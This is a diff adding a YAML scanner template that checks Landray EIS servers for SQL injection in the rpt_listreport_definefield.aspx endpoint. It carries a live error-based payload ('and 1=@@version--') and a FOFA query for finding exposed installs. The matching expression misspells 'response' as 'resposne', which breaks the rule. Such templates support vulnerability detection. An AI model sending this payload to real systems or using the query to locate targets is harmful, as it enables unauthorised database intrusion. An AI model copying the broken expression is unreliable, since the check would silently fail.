@@ -1,0 +1,20 @@
+id: landray-eis-rpt-listreport-definefield-sqli
+
+info:
+  name: 蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口SQL注入
+  author: zan8in
+  severity: high
+  verified: false
+  description: |-
+    蓝凌智慧协同平台eis集合了非常丰富的模块，满足组织企业在知识、协同、项目管理系统建设等需求。蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口存在SQL注入漏洞
+    fofa: icon_hash="953405444"||app="Landray-OA系统"
+  tags: landray,eis,sqli
+  created: 2024/03/05
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+
+    expression: resposne.body.bcontains(b"Microsoft SQL Server")
+expression: r0()
